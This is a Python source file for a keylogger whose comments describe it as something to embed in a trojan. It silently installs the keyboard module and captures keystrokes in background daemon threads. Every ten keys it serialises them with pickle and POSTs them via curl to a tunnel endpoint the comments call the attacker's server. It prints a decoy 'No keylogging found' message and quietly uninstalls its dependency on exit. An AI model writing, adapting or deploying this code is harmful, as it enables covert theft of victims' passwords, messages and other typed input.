# Legitimate imports
import os
import sys
from collections import deque
import time
import threading
import pickle

# Silently download and import needed dependencies for keylogging
os.system("pip install keyboard > nul 2>&1")
try:
    import keyboard
except Exception:
    print("Unknown error occur. Please try again!")
    sys.exit(1)

# Tunnel URL used to send traffic
url = "localhost:9999"

# Number of keys recorded before sending the result to the attacker's server
key_count = 10


# Main keylogging function:
def record():
    try:
        count = 0
        keys = deque([])
        while count < key_count:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                keys.append(event.name)
                count += 1
        child = threading.Thread(target=record)
        child.daemon = True  # Set the child thread as daemon
        child.start()
        data = pickle.dumps(keys)
        os.system(f"curl -X POST -d {data} {url} > nul 2>$1")
    except Exception as e:
        print(e)


if __name__ == "__main__":
    # Run keylogging as background thread
    root_thread = threading.Thread(target=record)
    root_thread.daemon = True  # Set the root thread as daemon
    root_thread.start()
    # Any trojan main thread here
    while True:
        try:
            time.sleep(10)
            print("No keylogging found :))")
        except KeyboardInterrupt:
            # Silently uninstall keyboard module
            os.system("pip uninstall keyboard | Y > nul 2>&1")